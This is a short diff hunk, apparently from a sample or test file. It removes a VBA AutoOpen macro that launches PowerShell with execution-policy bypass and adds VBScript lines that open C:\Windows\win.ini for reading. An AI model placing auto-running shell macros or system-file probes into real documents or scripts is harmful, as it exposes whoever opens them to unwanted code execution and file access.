@@ -1,3 +1,2 @@
-Sub AutoOpen()
-  Shell "cmd.exe /c powershell -ep bypass"
-End Sub
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.OpenTextFile("C:\Windows\win.ini", 1)
